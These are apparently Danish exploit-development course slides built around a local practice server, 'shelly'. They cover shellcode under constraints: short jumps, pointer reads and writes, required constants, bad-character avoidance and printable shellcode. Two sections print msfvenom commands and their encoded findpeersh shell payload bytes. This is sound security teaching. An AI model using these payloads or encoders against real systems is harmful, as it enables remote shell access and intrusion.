Udfordringer
------------
Nogen gange kan man ikke bare bruge en standard shellcode.

Her følger et par eksempler på udfordinger.

Udfordringer - Shelly
---------------------
De er implementeret i programmet 'shelly' som ligger i 'assignments'.

[source,bash]
------------------------------------------------
$ strace ./assignments/shelly --debug --port 1337
....
listen(3, 10)                           = 0
getpid()                                = 5290
accept(3,
------------------------------------------------

Udfordringer - Shelly
---------------------
[source,bash]
------------------------------------------------
$ nc localhost 1337
Hello there. How may I help you?
Choose from the menu:
 1) Execute up to 256 bytes shellcode
 2) Trampoline can only execute few bytes
 3) Read pointers
 4) Write pointers
 5) Required constants
 6) Avoid certain chars
 7) Shellcode needs to be printable
 8) Try fitting a 10000 byte shellcode into 64 bytes
 9) Go egg hunting
10) Go stack hunting
11) Exit
------------------------------------------------

Opgave 6 - 'ESP' + meget få bytes
---------------------------------
[source,bash]
------------------------------------------------
 2) Trampoline can only execute few bytes
------------------------------------------------

Typisk for off-by-a-few bugs.
[source,c]
------------------------------------------------
include::../assignments/trampoline_few_bytes[]
------------------------------------------------

Opgave 6 - 'ESP' + meget få bytes
---------------------------------
Typisk for off-by-a-few bugs.

image:../images/off-by-a-few.png[]

Opgave 6 - 'ESP' + meget få bytes
---------------------------------
Typisk for off-by-a-few bugs.

image:../images/off-by-a-few-solution.png[]

Short jumps (+127/-128) kan gøres på to bytes, skal man længere fylder det fem bytes.

Opgave 7 - Læste pointer
------------------------
[source,bash]
------------------------------------------------
 3) Read pointers
------------------------------------------------
[source,c]
------------------------------------------------
include::../assignments/read_pointers[]
------------------------------------------------

Opgave 7 - Læste pointer
------------------------
image:../images/read_pointer.png[]

Opgave 7 - Læste pointer
------------------------
image:../images/read_pointer-solution.png[]

I en ikke position independent executable:
[source,bash]
------------------------------------------------
$ cat /proc/12708/maps | grep shelly
08048000-0804a000 r-xp 00000000 fc:01 3553329   ...
0804b000-0804c000 r-xp 00002000 fc:01 3553329   ...
0804c000-0804d000 rwxp 00003000 fc:01 3553329   ...
------------------------------------------------

Opgave 8 - Skrevne pointere
---------------------------
[source,bash]
------------------------------------------------
 4) Write pointers
------------------------------------------------
[source,c]
------------------------------------------------
include::../assignments/write_pointers[]
------------------------------------------------

Opgave 8 - Skrevne pointere
---------------------------
image:../images/write_pointer.png[]

Opgave 8 - Skrevne pointere
---------------------------
image:../images/write_pointer-solution.png[]

I en ikke position independent executable:
[source,bash]
------------------------------------------------
$ cat /proc/12708/maps | grep shelly
08048000-0804a000 r-xp 00000000 fc:01 3553329   ...
0804b000-0804c000 r-xp 00002000 fc:01 3553329   ...
0804c000-0804d000 rwxp 00003000 fc:01 3553329   ...
------------------------------------------------

Opgave 9 - Krævede konstanter
-----------------------------
[source,bash]
------------------------------------------------
 5) Required constants
------------------------------------------------

[source,c]
------------------------------------------------
include::../assignments/required_constants[]
------------------------------------------------

Opgave 9 - Krævede konstanter
-----------------------------
image:../images/required_constants-solution.png[width="800"]

Opgave 10 - Filtre (bad chars)
------------------------------
[source,bash]
------------------------------------------------
 6) Avoid certain chars
------------------------------------------------
[source,c]
------------------------------------------------
include::../assignments/avoid_chars[]
------------------------------------------------

Opgave 10 - Filtre (bad chars)
------------------------------
image:../images/encoder_decoder.png[]

Opgave 10 - Filtre (bad chars)
------------------------------
[source,bash]
------------------------------------------------
$ shellcraft i386.linux.findpeersh | msfvenom --encoder x86/shikata_ga_nai --bad-chars '\x00\x0a\x0d\x20\x3d\x3b' --arch x86 --platform linux --format py
buf =  ""
buf += "\xba\x33\xb9\x97\x19\xda\xde\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x10\x83\xe8\xfc\x31\x50\x10\x03\x50\x10\xd1"
buf += "\x4c\xfd\xe6\x7f\xa8\x8b\xfc\x24\xe8\xe1\x98\x82\x52"
buf += "\x7b\x28\x16\xbb\xe9\xb5\x36\xf6\x6e\x30\x76\x69\x35"
buf += "\x4e\x9b\xe3\x3a\xda\x60\xad\xf5\x71\x59\x15\xcb\x06"
buf += "\xd0\x5d\xb9\x6e\x72\xb1\x11\x40\xf1\xa5\x42\xfc\x9c"
buf += "\x5b\x14\xe3\x6f\x6d\x4c\xef\xd7\xf4\x5c\x6f"
------------------------------------------------

Det er lidt forskelligt hvor meget Shikata Ga Nai decoderen fylder, men omkring 25-30 bytes. Hver byte i den oprindelige shellcode tilføjer én enkodet byte.

Opgave 11 - Printable
---------------------
[source,bash]
------------------------------------------------
 7) Shellcode needs to be printable
------------------------------------------------
[source,c]
------------------------------------------------
include::../assignments/printable_shellcode[]
------------------------------------------------

Opgave 11 - Printable
---------------------
[source,bash]
------------------------------------------------
$ shellcraft i386.linux.findpeersh | msfvenom --encoder x86/alpha_upper --arch x86 --platform linux BufferRegister=EAX
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 185 (iteration=0)
x86/alpha_upper chosen with final size 185
Payload size: 185 bytes
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZKOSZDGK9ZEQK1N3ZBF1HPFLMPL6DM0RJS4E08MMPMUIP3Q1J45ZMMYKCCZC3V9PICZGOV88MMPRUL8BJE8SXFO6O6OBSE8FOU2RIBNLIJCP1IY2J4KPXJ9XMK0AA
------------------------------------------------

Decoderen fylder 61 bytes, og hver byte i den oprindelige shellcode fylder to bytes enkodet.
